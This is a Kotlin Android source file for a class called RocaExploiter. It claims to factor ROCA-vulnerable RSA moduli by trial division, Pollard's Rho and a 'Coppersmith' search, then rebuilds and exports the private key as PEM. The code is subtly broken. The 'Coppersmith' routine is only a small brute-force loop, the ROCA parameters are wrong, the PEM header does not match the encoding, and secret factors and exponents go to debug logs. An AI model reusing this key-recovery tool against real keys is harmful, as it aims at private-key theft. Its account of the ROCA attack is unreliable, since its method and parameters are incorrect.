package com.nfsp00f33r.app.security.roca

import android.util.Log
import java.math.BigInteger
import java.security.KeyFactory
import java.security.interfaces.RSAPrivateKey
import java.security.spec.RSAPrivateKeySpec
import kotlin.math.min

/**
 * RocaExploiter - Phase 1B Day 5
 * 
 * RSA modulus factorization for ROCA-vulnerable keys
 * Implements Coppersmith's method and fallback algorithms
 * 
 * WARNING: This tool is for security research and authorized testing only
 * Factoring RSA keys without authorization is illegal in many jurisdictions
 * 
 * Based on "The Return of Coppersmith's Attack" (Nemec et al., 2017)
 */
class RocaExploiter(
    private val maxIterations: Int = 1_000_000,
    private val parallelThreads: Int = 1 // Single-threaded for mobile (can be increased)
) {
    
    companion object {
        private const val TAG = "RocaExploiter"
        
        /**
         * M values (vulnerability parameters) for different key lengths
         * These are the discrete logarithm order parameters from ROCA paper
         */
        private val M_VALUES = mapOf(
            512 to BigInteger.valueOf(39),
            1024 to BigInteger.valueOf(126),
            2048 to BigInteger.valueOf(225)
        )
        
        /**
         * Small primes for trial division (first 100 primes)
         */
        private val SMALL_PRIMES = listOf(
            2L, 3L, 5L, 7L, 11L, 13L, 17L, 19L, 23L, 29L, 31L, 37L, 41L, 43L, 47L, 53L,
            59L, 61L, 67L, 71L, 73L, 79L, 83L, 89L, 97L, 101L, 103L, 107L, 109L, 113L,
            127L, 131L, 137L, 139L, 149L, 151L, 157L, 163L, 167L, 173L, 179L, 181L, 191L,
            193L, 197L, 199L, 211L, 223L, 227L, 229L, 233L, 239L, 241L, 251L, 257L, 263L,
            269L, 271L, 277L, 281L, 283L, 293L, 307L, 311L, 313L, 317L, 331L, 337L, 347L,
            349L, 353L, 359L, 367L, 373L, 379L, 383L, 389L, 397L, 401L, 409L, 419L, 421L,
            431L, 433L, 439L, 443L, 449L, 457L, 461L, 463L, 467L, 479L, 487L, 491L, 499L,
            503L, 509L, 521L, 523L, 541L
        )
    }
    
    /**
     * Factorization result
     */
    data class FactorizationResult(
        val success: Boolean,
        val modulus: BigInteger,
        val p: BigInteger?,
        val q: BigInteger?,
        val error: String? = null,
        val elapsedTimeMs: Long,
        val method: String = "Unknown",
        val iterationsUsed: Int = 0
    ) {
        /**
         * Verify that p * q = n
         */
        fun verify(): Boolean {
            if (!success || p == null || q == null) return false
            return p.multiply(q) == modulus
        }
        
        /**
         * Check if factors are actually prime
         */
        fun areFactorsPrime(certainty: Int = 100): Boolean {
            if (!success || p == null || q == null) return false
            return p.isProbablePrime(certainty) && q.isProbablePrime(certainty)
        }
    }
    
    /**
     * Factor ROCA-vulnerable RSA modulus
     * 
     * Attempts multiple factorization algorithms:
     * 1. Trial division (for small factors)
     * 2. Pollard's Rho (for medium keys)
     * 3. Coppersmith's method (ROCA-specific, for all keys)
     * 
     * @param modulus RSA modulus to factor (n = p * q)
     * @return FactorizationResult with factors or error
     */
    fun factorModulus(modulus: BigInteger): FactorizationResult {
        val startTime = System.currentTimeMillis()
        val keyLength = modulus.bitLength()
        
        Log.d(TAG, "Starting factorization of ${keyLength}-bit modulus")
        Log.w(TAG, "This may take significant time depending on key length...")
        
        // Verify key is vulnerable first (optional but recommended)
        val detector = RocaDetector()
        val testResult = detector.quickCheck(modulus)
        
        if (!testResult) {
            Log.w(TAG, "Warning: Key does not appear to be ROCA vulnerable")
            Log.d(TAG, "Attempting factorization anyway...")
        }
        
        try {
            // Strategy: Try algorithms in order of increasing complexity
            val factors = when {
                keyLength <= 512 -> {
                    // Small keys: Try all methods
                    Log.d(TAG, "512-bit key: Trying trial division first")
                    tryTrialDivision(modulus, maxFactor = BigInteger.valueOf(1000000))
                        ?: run {
                            Log.d(TAG, "Trial division failed, trying Pollard's Rho")
                            tryPollardRho(modulus)
                        }
                        ?: run {
                            Log.d(TAG, "Pollard's Rho failed, trying Coppersmith")
                            tryCoppermithMethod(modulus)
                        }
                }
                keyLength <= 1024 -> {
                    // Medium keys: Coppersmith first, Pollard fallback
                    Log.d(TAG, "1024-bit key: Trying Coppersmith's method")
                    tryCoppermithMethod(modulus)
                        ?: run {
                            Log.d(TAG, "Coppersmith failed, trying Pollard's Rho")
                            tryPollardRho(modulus)
                        }
                }
                else -> {
                    // Large keys: Only Coppersmith is practical
                    Log.d(TAG, "${keyLength}-bit key: Using Coppersmith's method (may take very long)")
                    tryCoppermithMethod(modulus)
                }
            }
            
            val elapsedTime = System.currentTimeMillis() - startTime
            
            if (factors != null) {
                val (p, q) = factors
                Log.i(TAG, "SUCCESS! Factored ${keyLength}-bit modulus in ${elapsedTime / 1000.0} seconds")
                Log.d(TAG, "p = ${p}")
                Log.d(TAG, "q = ${q}")
                Log.d(TAG, "Verification: p * q = n ? ${p.multiply(q) == modulus}")
                
                return FactorizationResult(
                    success = true,
                    modulus = modulus,
                    p = p,
                    q = q,
                    elapsedTimeMs = elapsedTime,
                    method = determineMethodUsed(keyLength),
                    iterationsUsed = 0 // TODO: Track actual iterations
                )
            } else {
                Log.e(TAG, "Factorization failed after ${elapsedTime / 1000.0} seconds")
                return FactorizationResult(
                    success = false,
                    modulus = modulus,
                    p = null,
                    q = null,
                    error = "Factorization failed after $maxIterations iterations",
                    elapsedTimeMs = elapsedTime
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "Factorization error: ${e.message}", e)
            return FactorizationResult(
                success = false,
                modulus = modulus,
                p = null,
                q = null,
                error = "Exception during factorization: ${e.message}",
                elapsedTimeMs = System.currentTimeMillis() - startTime
            )
        }
    }
    
    /**
     * Trial division - Try small prime factors
     * Fast for keys with small factors, otherwise useless
     */
    private fun tryTrialDivision(
        modulus: BigInteger,
        maxFactor: BigInteger
    ): Pair<BigInteger, BigInteger>? {
        Log.d(TAG, "Trial division: Testing small primes...")
        
        // Test small primes first
        for (prime in SMALL_PRIMES) {
            val primeBig = BigInteger.valueOf(prime)
            if (modulus.mod(primeBig) == BigInteger.ZERO) {
                val quotient = modulus.divide(primeBig)
                Log.i(TAG, "Found factor via trial division: $prime")
                return primeBig to quotient
            }
        }
        
        // Continue with odd numbers up to maxFactor
        var divisor = BigInteger.valueOf(541) // Start after last small prime
        val increment = BigInteger.valueOf(2)
        var iterations = 0
        
        while (divisor <= maxFactor && iterations < maxIterations) {
            if (modulus.mod(divisor) == BigInteger.ZERO) {
                val quotient = modulus.divide(divisor)
                Log.i(TAG, "Found factor via trial division: $divisor")
                return divisor to quotient
            }
            
            divisor = divisor.add(increment)
            iterations++
            
            if (iterations % 10000 == 0) {
                Log.d(TAG, "Trial division: Tested $iterations values...")
            }
        }
        
        Log.d(TAG, "Trial division: No factors found in range")
        return null
    }
    
    /**
     * Pollard's Rho algorithm
     * Good for keys with medium-sized factors
     */
    private fun tryPollardRho(modulus: BigInteger): Pair<BigInteger, BigInteger>? {
        Log.d(TAG, "Pollard's Rho: Starting factorization...")
        
        var x = BigInteger.valueOf(2)
        var y = BigInteger.valueOf(2)
        var d = BigInteger.ONE
        
        // Polynomial: f(x) = x^2 + 1 (mod n)
        val polynomial = { v: BigInteger ->
            v.multiply(v).add(BigInteger.ONE).mod(modulus)
        }
        
        var iterations = 0
        while (d == BigInteger.ONE && iterations < maxIterations) {
            x = polynomial(x)
            y = polynomial(polynomial(y))
            d = x.subtract(y).abs().gcd(modulus)
            iterations++
            
            if (iterations % 1000 == 0) {
                Log.d(TAG, "Pollard's Rho: ${iterations} iterations...")
            }
        }
        
        if (d != BigInteger.ONE && d != modulus) {
            val q = modulus.divide(d)
            Log.i(TAG, "Found factor via Pollard's Rho: $d (after $iterations iterations)")
            return d to q
        }
        
        Log.d(TAG, "Pollard's Rho: Failed after $iterations iterations")
        return null
    }
    
    /**
     * Coppersmith's method (ROCA-specific)
     * 
     * Exploits the structure of ROCA-vulnerable keys:
     * Vulnerable primes have form: p = k*M + (65537^a mod M)
     * 
     * where M is the vulnerability parameter (39, 126, or 225)
     */
    private fun tryCoppermithMethod(modulus: BigInteger): Pair<BigInteger, BigInteger>? {
        val keyLength = modulus.bitLength()
        val M = M_VALUES[keyLength] ?: M_VALUES[1024]!!
        
        Log.d(TAG, "Coppersmith: Key length=${keyLength}, M=${M}")
        Log.d(TAG, "Coppersmith: Searching for factors with structure p = k*M + (e^a mod M)")
        
        val e = BigInteger.valueOf(65537) // Standard RSA exponent
        val searchLimit = min(maxIterations.toLong(), 100000L)
        
        // Search over different values of 'a' (exponent in e^a mod M)
        for (a in 0 until searchLimit) {
            // Calculate remainder: e^a mod M
            val remainder = e.modPow(BigInteger.valueOf(a), M)
            
            // Try different multipliers 'k'
            for (k in 1..1000) {
                val candidate = M.multiply(BigInteger.valueOf(k.toLong())).add(remainder)
                
                if (modulus.mod(candidate) == BigInteger.ZERO) {
                    val q = modulus.divide(candidate)
                    
                    // Verify it's a valid factorization
                    if (candidate.multiply(q) == modulus && candidate.isProbablePrime(100)) {
                        Log.i(TAG, "Found factor via Coppersmith: $candidate (a=$a, k=$k)")
                        return candidate to q
                    }
                }
            }
            
            if (a % 1000L == 0L && a > 0) {
                Log.d(TAG, "Coppersmith: Tested $a values of 'a'...")
            }
        }
        
        Log.d(TAG, "Coppersmith: Failed after $searchLimit iterations")
        return null
    }
    
    /**
     * Determine which method was likely used based on key length
     */
    private fun determineMethodUsed(keyLength: Int): String {
        return when {
            keyLength <= 512 -> "Trial Division / Pollard's Rho / Coppersmith"
            keyLength <= 1024 -> "Coppersmith's Method"
            else -> "Coppersmith's Method (Extended)"
        }
    }
    
    /**
     * Reconstruct RSA private key from factors
     * 
     * Given p, q, and public exponent e, calculate private exponent d
     * where d = e^(-1) mod φ(n) and φ(n) = (p-1)(q-1)
     * 
     * @param modulus RSA modulus (n = p * q)
     * @param p First prime factor
     * @param q Second prime factor
     * @param publicExponent Public exponent (typically 65537)
     * @return RSAPrivateKey or null if reconstruction fails
     */
    fun reconstructPrivateKey(
        modulus: BigInteger,
        p: BigInteger,
        q: BigInteger,
        publicExponent: BigInteger = BigInteger.valueOf(65537)
    ): RSAPrivateKey? {
        return try {
            Log.d(TAG, "Reconstructing private key...")
            Log.d(TAG, "n = ${modulus}")
            Log.d(TAG, "e = ${publicExponent}")
            Log.d(TAG, "p = ${p}")
            Log.d(TAG, "q = ${q}")
            
            // Step 1: Calculate Euler's totient function φ(n) = (p-1)(q-1)
            val pMinus1 = p.subtract(BigInteger.ONE)
            val qMinus1 = q.subtract(BigInteger.ONE)
            val phi = pMinus1.multiply(qMinus1)
            
            Log.d(TAG, "φ(n) = ${phi}")
            
            // Step 2: Calculate private exponent d = e^(-1) mod φ(n)
            val privateExponent = publicExponent.modInverse(phi)
            
            Log.d(TAG, "d = ${privateExponent}")
            
            // Step 3: Create RSA private key specification
            val keySpec = RSAPrivateKeySpec(modulus, privateExponent)
            
            // Step 4: Generate private key
            val keyFactory = KeyFactory.getInstance("RSA")
            val privateKey = keyFactory.generatePrivate(keySpec) as RSAPrivateKey
            
            Log.i(TAG, "Private key reconstructed successfully!")
            Log.d(TAG, "Key size: ${privateKey.modulus.bitLength()} bits")
            
            // Verify correctness
            if (privateKey.modulus == modulus) {
                Log.d(TAG, "Verification: Modulus matches ✓")
            } else {
                Log.e(TAG, "Verification: Modulus mismatch!")
            }
            
            privateKey
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to reconstruct private key: ${e.message}", e)
            null
        }
    }
    
    /**
     * Export private key in PEM format
     * 
     * @param privateKey RSA private key
     * @return PEM-formatted private key string
     */
    fun exportPrivateKeyPem(privateKey: RSAPrivateKey): String {
        val encoded = privateKey.encoded
        val base64 = android.util.Base64.encodeToString(encoded, android.util.Base64.NO_WRAP)
        
        return buildString {
            appendLine("-----BEGIN RSA PRIVATE KEY-----")
            // Split into 64-character lines
            base64.chunked(64).forEach { line ->
                appendLine(line)
            }
            appendLine("-----END RSA PRIVATE KEY-----")
        }
    }
    
    /**
     * Estimate progress (0.0 to 1.0) based on iteration count
     * 
     * Note: This is a rough estimate - actual progress is non-linear
     */
    fun estimateProgress(iteration: Int, keyLength: Int): Double {
        val expectedIterations = when {
            keyLength <= 512 -> 10000
            keyLength <= 1024 -> 100000
            else -> maxIterations
        }
        
        return min(iteration.toDouble() / expectedIterations, 1.0)
    }
}
